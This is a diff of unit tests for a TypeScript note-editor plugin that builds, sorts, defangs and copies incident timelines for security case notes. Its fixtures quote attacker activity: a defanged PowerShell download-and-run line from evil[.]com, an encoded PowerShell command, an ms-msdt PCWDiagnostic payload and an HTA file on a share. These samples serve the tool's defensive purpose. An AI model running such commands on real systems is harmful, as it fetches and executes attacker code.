@@ -11,9 +11,11 @@ import {
   deleteEvent,
   makeTimeline,
   moveEvent,
+  selectedLines,
   setEventKind,
   sortEventsByTime
 } from './actions'
+import { defangText } from '../soc/toolbox'
 import { TIMELINE_MARKER, copyForTicket, findTimelines } from './parse'
 
 /** The ClickFix sample from the design spec, as it sits in a case note. */
@@ -132,6 +134,53 @@ describe('makeTimeline', () => {
     // Less indented than the first line, so not part of its list.
     expect(makeTimeline(['    first', 'second'], 0, 1)).toBeNull()
   })
+
+  it('makes nothing over a selection with a code block, a numbered list or a divider in it', () => {
+    const code = ['## Findings:', '- At 11:05 ran:', '```', 'powershell -enc AAA', '```', '- At 11:06 next']
+    expect(makeTimeline(code, 0, 5)).toBeNull()
+    expect(makeTimeline(['- a', '~~~', 'b', '~~~'], 0, 3)).toBeNull()
+    expect(makeTimeline(['1. At 11:04 a', '2. At 11:05 b'], 0, 1)).toBeNull()
+    expect(makeTimeline(['11:04 a', '3) b'], 0, 1)).toBeNull()
+    for (const divider of ['---', '***', '- - -', ' _ _ _']) {
+      expect(makeTimeline(['11:04 a', divider, '11:05 b'], 0, 2)).toBeNull()
+    }
+  })
+
+  it("keeps a code block that is an event's detail when making a timeline over a list", () => {
+    const note = ['- At 11:05 ran:', '  ```', '  # stage 1', '', '', '  ```', '- At 11:06 next']
+    expect(apply(note, makeTimeline(note, 0, 6))).toEqual([TIMELINE_MARKER, ...note])
+    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([TIMELINE_MARKER, ...note])
+    // The fence opened on the bullet itself.
+    const own = ['- ```sh', '  # stage 1', '', '', '  ```', '- At 11:06 next']
+    expect(apply(own, makeTimeline(own, 5, 5))).toEqual([TIMELINE_MARKER, ...own])
+  })
+
+  it('makes nothing in YAML frontmatter', () => {
+    const note = ['---', 'tags:', '  - malware', 'assignees:', '  - Farhan', '---', '- a', '- b']
+    for (const line of [0, 1, 2, 4, 5]) expect(makeTimeline(note, line, line)).toBeNull()
+    expect(makeTimeline(note, 4, 7)).toBeNull()
+    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([...note.slice(0, 6), TIMELINE_MARKER, '- a', '- b'])
+  })
+})
+
+describe('selectedLines', () => {
+  const editor = (from: EditorPosition, to: EditorPosition) =>
+    ({ getCursor: (which: string) => (which === 'from' ? from : to) }) as unknown as Editor
+
+  it('leaves out the line a selection ends at column 0 of (a triple-click, Shift+Down)', () => {
+    expect(selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))).toEqual([1, 2])
+    expect(selectedLines(editor({ line: 1, ch: 2 }, { line: 3, ch: 1 }))).toEqual([1, 3])
+    expect(selectedLines(editor({ line: 2, ch: 0 }, { line: 2, ch: 0 }))).toEqual([2, 2])
+    const note = ['## F', '11:04 a', '11:05 b', 'Summary para']
+    const [from, to] = selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))
+    expect(apply(note, makeTimeline(note, from, to))).toEqual([
+      '## F',
+      TIMELINE_MARKER,
+      '- 11:04 a',
+      '- 11:05 b',
+      'Summary para'
+    ])
+  })
 })
 
 describe('addEventBelow and addEventAtEnd', () => {
@@ -183,6 +232,19 @@ describe('addEventBelow and addEventAtEnd', () => {
     expect(addEventBelow(CLICKFIX, 0)).toBeNull()
     expect(addEventAtEnd(CLICKFIX, 0)).toBeNull()
     expect(addEventBelow(['- one'], 0)).toBeNull()
+  })
+
+  it('adds after a code block in the last event, never inside it', () => {
+    const note = [
+      TIMELINE_MARKER,
+      '- At 11:06, Execution: ran the stager',
+      '  ```powershell',
+      '  # stage 1',
+      '  iex (iwr hxxp://evil[.]com/a.ps1)',
+      '  ```'
+    ]
+    expect(apply(note, addEventAtEnd(note, 0))).toEqual([...note, '- '])
+    expect(apply(note, addEventBelow(note, 3))).toEqual([...note, '- '])
   })
 })
 
@@ -300,6 +362,27 @@ describe('setEventKind', () => {
     expect(setEventKind(CLICKFIX, 0, 'web')).toBeNull()
     expect(setEventKind(CLICKFIX, 3, 'observed')).toBeNull()
   })
+
+  it('keeps a bare bullet a bullet', () => {
+    const note = [TIMELINE_MARKER, '- At 11:05 a', '-', '- At 11:06 b']
+    const out = apply(note, setEventKind(note, 2, 'detection'))
+    expect(out[2]).toBe('- Detection: ')
+    expect(texts(out)).toEqual(['At 11:05 a', 'Detection: ', 'At 11:06 b'])
+  })
+
+  it('writes no kind in front of a code fence on the bullet, which would end the code and the timeline', () => {
+    const note = [TIMELINE_MARKER, '- ```sh', '  # stage 1', '  ```', '- At 11:06 b']
+    expect(setEventKind(note, 1, 'execution')).toBeNull()
+  })
+
+  it('writes the kind after a task box and its time, keeping the task', () => {
+    const note = [TIMELINE_MARKER, '- [x] At 11:05, isolated host', '- [ ] 11:06 notify', '- [ ] call the vendor']
+    expect(apply(note, setEventKind(note, 1, 'response'))[1]).toBe('- [x] At 11:05, Response: isolated host')
+    expect(apply(note, setEventKind(note, 2, 'email'))[2]).toBe('- [ ] 11:06 Email: notify')
+    expect(apply(note, setEventKind(note, 3, 'response'))[3]).toBe('- [ ] Response: call the vendor')
+    const auto = [TIMELINE_MARKER, '- [x] At 11:05, Response: isolated host']
+    expect(apply(auto, setEventKind(auto, 1, 'auto'))[1]).toBe('- [x] At 11:05, isolated host')
+  })
 })
 
 describe('sortEventsByTime', () => {
@@ -374,6 +457,28 @@ describe('sortEventsByTime', () => {
   it('offers nothing outside a timeline', () => {
     expect(sortEventsByTime(['- 11:06 b', '- 11:04 a'], 0)).toBeNull()
   })
+
+  it('refuses when sorting would take a time-only event away from the numeric date above it', () => {
+    const note = [TIMELINE_MARKER, '- At 10/9/26, 2:29 AM email sent', '- At 2:20 AM user clicked']
+    expect(sortEventsByTime(note, 1)).toEqual({
+      reason: 'Sorting would move an event onto another day: write its date on it first'
+    })
+  })
+
+  it('never sorts clocks written in different zones', () => {
+    const zones = { reason: 'The times are written in different zones, so their order is unknown' }
+    const note = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 07:10 EDT, c']
+    expect(sortEventsByTime(note, 1)).toEqual(zones)
+    expect(sortEventsByTime([TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 11:05, c'], 1)).toEqual(
+      zones
+    )
+    // Unordered across zones is not known to be out of order, so nothing is offered.
+    expect(sortEventsByTime([TIMELINE_MARKER, '- At 13:10 +02:00, b', '- At 11:04 UTC, a'], 1)).toBeNull()
+    const same = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b']
+    const r = sortEventsByTime(same, 1)
+    if (!r || !('edit' in r)) throw new Error('expected an edit')
+    expect(texts(apply(same, r.edit))).toEqual(['At 11:04 UTC, b', 'At 11:06 UTC, a'])
+  })
 })
 
 describe('deleteEvent', () => {
@@ -394,6 +499,41 @@ describe('deleteEvent', () => {
   it('offers nothing on the marker or outside', () => {
     expect(deleteEvent(CLICKFIX, 1)).toBeNull()
     expect(deleteEvent(CLICKFIX, 0)).toBeNull()
+  })
+
+  it('leaves one blank line between events in a loose list, so the timeline stays whole', () => {
+    const note = [TIMELINE_MARKER, '- a', '', '- b', '', '- c']
+    const out = apply(note, deleteEvent(note, 3))
+    expect(out).toEqual([TIMELINE_MARKER, '- a', '', '- c'])
+    expect(texts(out)).toEqual(['a', 'c'])
+    const first = [TIMELINE_MARKER, '', '- a', '', '- b']
+    expect(texts(apply(first, deleteEvent(first, 2)))).toEqual(['b'])
+    const last = [TIMELINE_MARKER, '- a', '', '- b', '', 'After.']
+    expect(apply(last, deleteEvent(last, 3))).toEqual([TIMELINE_MARKER, '- a', '', 'After.'])
+  })
+
+  it('removes the code block in an event with it', () => {
+    const note = [
+      TIMELINE_MARKER,
+      '- At 11:06, Execution: ran the stager',
+      '  ```powershell',
+      '  # stage 1',
+      '  iex (iwr hxxp://evil[.]com/a.ps1)',
+      '  ```',
+      '- At 11:07 next',
+      '- At 11:05 earlier'
+    ]
+    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- At 11:07 next', '- At 11:05 earlier'])
+    const tab = [TIMELINE_MARKER, '- At 11:06 ran:', '\t```', '\t$a = 1', '', '', '\t$b = 2', '\t```', '- At 11:05 x']
+    expect(apply(tab, deleteEvent(tab, 1))).toEqual([TIMELINE_MARKER, '- At 11:05 x'])
+  })
+
+  it('takes the blank lines an unclosed fence holds with its event, so the rest stays in the timeline', () => {
+    const note = [TIMELINE_MARKER, '- a', '  ```', '  x', '', '', '- b', '- c']
+    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- b', '- c'])
+    const loose = [TIMELINE_MARKER, '', '- a', '  ```', '  x', '', '', '- b']
+    expect(texts(apply(loose, deleteEvent(loose, 2)))).toEqual(['b'])
+    expect(texts(apply(note, moveEvent(note, 1, 'down')))).toEqual(['b', 'a', 'c'])
   })
 })
 
@@ -462,6 +602,45 @@ describe('copyText', () => {
     expect(copyText(CLICKFIX, 1)).toBe(copyForTicket(block))
     expect(copyText(CLICKFIX, 7)).toBe(copyForTicket(block))
     expect(copyText(CLICKFIX, 0)).toBeNull()
+  })
+
+  it('defangs what Defang timeline would, before a value moves into prose', () => {
+    const note = [
+      TIMELINE_MARKER,
+      '- At 11:05, the user browsed.',
+      '    - Source: evil.com',
+      '- Download: promptcraft.online',
+      '- evil.org'
+    ]
+    expect(copyText(note, 0)?.split('\n')).toEqual([
+      'Timeline (3 events)',
+      '11:05      the user browsed. Source: evil[.]com',
+      '--:--      Download: promptcraft[.]online (time not recorded)',
+      '--:--      evil[.]org (time not recorded)'
+    ])
+  })
+
+  it('agrees with the live count and Defang timeline on what is live', () => {
+    const notes = [
+      [TIMELINE_MARKER, '- At 11:05, the user browsed.', '    - Source: evil.com'],
+      [TIMELINE_MARKER, '- At 11:05, seen 1.2.3.4,evil.com'],
+      [TIMELINE_MARKER, '- At 11:05, opened file://evil-share/x.hta'],
+      [TIMELINE_MARKER, '- At 11:05, ran it', '    - Payload: ms-msdt:/id PCWDiagnostic'],
+      [TIMELINE_MARKER, '- At 11:05, fetched from promptcraft.online.'],
+      CLICKFIX
+    ]
+    for (const note of notes) {
+      const line = findTimelines(note)[0].markerLine
+      const live = findTimelines(note)[0].summary.live
+      const r = defangTimeline(note, line)
+      expect(r?.changed).toBe(live > 0)
+      const after = apply(note, r?.edit ?? null)
+      expect(findTimelines(after)[0].summary.live).toBe(0)
+      // Nothing is left for a later defang to find, and the copy is the defanged note's copy.
+      const copy = copyText(note, line) ?? ''
+      expect(defangText(copy)).toBe(copy)
+      expect(copy).toBe(copyText(after, line))
+    }
   })
 })
 
